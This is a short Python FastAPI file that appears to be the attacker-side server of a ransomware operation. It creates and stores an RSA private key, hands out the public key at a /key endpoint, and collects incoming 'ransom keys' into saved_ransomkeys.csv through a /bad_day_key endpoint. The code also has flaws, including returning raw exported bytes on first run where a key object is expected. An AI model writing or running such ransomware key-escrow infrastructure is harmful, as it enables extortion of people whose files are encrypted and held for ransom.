import os
from fastapi import FastAPI, Request
from Crypto.PublicKey import RSA

def get_saved_key():
    with open("private_key.pem","rb") as priv_file:
            private_key = RSA.import_key(priv_file.read())
    return private_key

        
def get_private_key():
    if os.path.exists("private_key.pem"):
        private_key = get_saved_key()

    else:
        key = RSA.generate(2048)
        private_key = key.export_key()
        with open("private_key.pem","wb") as priv_file:
            priv_file.write(private_key)
    return private_key


get_private_key()


app = FastAPI()


@app.get("/")
def what():
    return {"message" : "Hello World"}


@app.get("/key")
def generate_public_key():
    private_key = get_private_key()
    return {"key" : private_key.publickey().export_key().decode()}


@app.post("/bad_day_key")
async def save_ransom_key(request: Request):
    ransom_key = await request.body()
    f = open("saved_ransomkeys.csv","a")
    f.write("ransom_key: " + ransom_key.hex())

    